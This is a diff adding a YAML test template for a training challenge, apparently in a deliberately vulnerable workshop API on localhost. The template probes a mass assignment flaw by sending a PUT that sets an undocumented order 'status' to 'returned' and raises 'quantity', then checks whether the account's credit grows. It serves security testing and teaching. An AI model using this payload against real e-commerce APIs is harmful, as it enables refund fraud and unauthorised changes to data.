@@ -1,0 +1,35 @@
+name: Mass Assignment template for challenge 8 
+
+description: |- 
+              Endpoint /workshop/api/shop/orders/{order_id} was suspected to be affected by mass assignment vulnerability.
+              There is an undocumented variable "status" that can be affected by the PUT request. 
+              This endpoint requires authentication.
+              The following will test the endpoint for Mass Assignment vulnerability found by:
+                 checking for status_code as it was observed that status_code 200 is the code for successful PUT request. 
+                 text pattern "quantity":{value} to confirm the changes
+                 sending a GET request to check if balance has increased.
+
+requests:
+  - url: http://localhost:8888/workshop/api/shop/orders/{add your own order_id}
+    method: PUT
+    json:
+      quantity: 10
+      status: returned
+    headers:
+      Content-Type: application/json
+      Authorization: Bearer {add your own jwt}
+    response_checks:
+      - status_code: 200
+      - text:
+          - pattern: '"quantity":10'
+          - pattern: '"status":"returned"'
+
+  - url: http://localhost:8888/workshop/api/shop/products
+    method: GET
+    headers:
+      Authorization: {add your own jwt}
+    response_checks:
+      - status_code: 200
+      - text:
+          - pattern: '"credit":{value to check}'
+      
